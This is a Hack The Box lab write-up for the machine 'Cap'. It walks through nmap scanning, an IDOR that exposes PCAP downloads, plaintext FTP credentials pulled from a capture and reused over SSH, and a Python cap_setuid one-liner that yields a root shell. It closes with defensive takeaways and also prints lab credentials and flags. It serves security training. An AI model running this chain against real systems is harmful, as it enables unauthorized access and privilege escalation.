---
title: "HTB: Cap — IDOR to Root via Linux Capabilities"
date: 2026-06-23 09:00:00 +0300
categories: [Labs, HTB]
tags: [hackthebox, idor, linux, capabilities, ftp, privilege escalation, pcap, wireshark, soc, blue team]
description: Cap is an easy HackTheBox Linux machine that chains an IDOR vulnerability, plaintext FTP credentials in a PCAP file, and a Linux capability misconfiguration on Python 3.8 to achieve full root access. A clean example of how misconfigurations compound.
image:
  path: https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&q=80
  alt: Network capture and packet analysis forensics
---

## Overview

**Platform:** Hack The Box
**Machine:** Cap
**Difficulty:** Easy
**OS:** Linux
**IP:** 10.129.109.120
**Date:** June 23, 2026

Cap chains three distinct weaknesses: an Insecure Direct Object Reference on a web dashboard, plaintext credentials exposed in an FTP session captured in a PCAP file, and a Linux capability misconfiguration that makes Python 3.8 effectively root-equivalent. No single vulnerability is catastrophic on its own. Together they produce a full compromise in minutes.

**Verified completion:** [HTB Achievement](https://labs.hackthebox.com/achievement/machine/3045385/351)

---

## Reconnaissance

```bash
nmap -sC -sV -oN initial_scan.txt 10.129.109.120
```

Three open TCP ports:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
```

FTP, SSH, and a Python web application. I focused on port 80 first.

---

## Web Enumeration

Navigating to `http://10.129.109.120` revealed a Security Dashboard with four endpoints:

```
/           Dashboard
/capture    Security Snapshot (5 Second PCAP)
/ip         IP Config
/netstat    Network Status
```

The logged-in username **Nathan** was visible in the top right corner.

Clicking "Security Snapshot" triggered a 5-second packet capture and redirected to `/data/2`, displaying packet statistics and a download link pointing to `/download/2`.

---

## IDOR Vulnerability

The numeric ID in the URL immediately stood out. I tested whether other IDs were accessible without authorization:

```
/data/0   -> valid response
/data/1   -> valid response
/data/2   -> valid response
```

No session check. No ownership check. Any unauthenticated or unauthorized user could access any capture by simply changing the number. This is a textbook **Insecure Direct Object Reference (IDOR)**.

I downloaded all available captures:

```bash
curl -o pcap0.pcap http://10.129.109.120/download/0
curl -o pcap1.pcap http://10.129.109.120/download/1
curl -o pcap2.pcap http://10.129.109.120/download/2
```

---

## Credential Extraction

I searched the PCAP files for authentication data:

```bash
strings pcap0.pcap | grep -iE "pass|user|login"
```

PCAP ID 0 contained only 72 packets and immediately revealed plaintext FTP credentials:

```
USER nathan
PASS Buck3tH4TF0RM3!
```

FTP transmits everything in cleartext by default. Any captured FTP session is a credential goldmine. This is exactly why FTP should never be used over a network where traffic can be observed.

---

## Initial Foothold

Anonymous FTP login was disabled, but I tested the credentials against SSH, banking on password reuse:

```bash
ssh nathan@10.129.109.120
# Password: Buck3tH4TF0RM3!
```

Success. User flag retrieved from Nathan's home directory:

```bash
cat ~/user.txt
```

Password reuse turned a read-only IDOR vulnerability into a valid shell.

---

## Privilege Escalation

With a foothold as Nathan, I enumerated privilege escalation paths.

Sudo access was unavailable:

```bash
sudo -l
# Sorry, user nathan may not run sudo on cap.
```

I then checked for Linux capabilities assigned to binaries on the system:

```bash
getcap -r / 2>/dev/null
```

Output:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This is a critical misconfiguration. The `cap_setuid` capability allows a process to arbitrarily change its effective user ID. Assigned to a general-purpose interpreter like Python, it means any user who can run Python 3.8 can set their UID to 0 (root) and do whatever they want.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root shell. Root flag retrieved:

```bash
cat /root/root.txt
```

---

## Attack Chain Summary

```
Nmap scan
  -> Web dashboard discovered on port 80
     -> IDOR: /data/0 accessible without authorization
        -> PCAP downloaded: FTP session with plaintext credentials
           -> SSH login via password reuse (nathan:Buck3tH4TF0RM3!)
              -> Linux capability enumeration (getcap -r /)
                 -> cap_setuid on Python 3.8
                    -> os.setuid(0) -> root shell
```

---

## Flags

| Flag | Value |
|---|---|
| User | f2c61c183a4010e1f208a163a0c0236b |
| Root | a625e64726e35dd0648bbb91a673ba5a |

---

## Key Takeaways

**IDOR vulnerabilities are authorization failures, not authentication failures.** Nathan was logged in. The application knew who he was. It simply never checked whether he was allowed to access `/data/0`. Always verify that users can only access resources they own.

**FTP sends credentials in cleartext.** Any network observer with access to a capture can read them. Use SFTP or FTPS. There is no legitimate reason to use unencrypted FTP on any modern network.

**Password reuse multiplies blast radius.** One compromised credential on one service should not unlock another. Credential stuffing and reuse are real attack patterns. Service accounts and human accounts should each have unique passwords.

**Linux capabilities are root in disguise.** `cap_setuid` on an interpreter is functionally equivalent to giving a SUID root binary to every user on the system. Audit capabilities regularly with `getcap -r /` and remove anything that is not explicitly required.

**Misconfigurations compound.** No single issue here was catastrophic in isolation. The IDOR alone gives read access to captures. The plaintext FTP alone is just bad hygiene. The password reuse alone is common. The misconfigured capability alone needs a local account. Stack them and you have a full compromise from the network edge to root. Defenders need to think in chains, not individual findings.

---

*HTB Cap | Completed by Glenn Ongalo | June 2026*
